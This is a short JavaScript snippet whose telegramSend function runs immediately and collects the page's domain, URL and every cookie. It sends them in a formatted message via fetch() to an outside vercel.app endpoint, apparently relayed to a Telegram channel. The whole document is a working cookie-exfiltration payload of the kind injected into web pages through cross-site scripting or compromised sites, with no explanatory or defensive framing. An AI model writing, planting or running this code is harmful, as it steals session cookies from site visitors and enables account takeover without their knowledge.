function telegramSend() {
    var domain = document.domain || '-';
    var url    = location.href || '-';
    var cookie = document.cookie
        ? document.cookie.split('; ').join('\n│ ')
        : 'No Cookie';

    var message =
`<pre>┌───────────────
│ 📡 DOMAIN : ${domain}
│ 🌐 URL    : ${url}
│ ⚙️ COOKIE :
│ ${cookie}
└───────────</pre>`;

    fetch(
        'https://api-xi-two-52.vercel.app/api/config?message=' +
        encodeURIComponent(message)
    );
}

telegramSend();
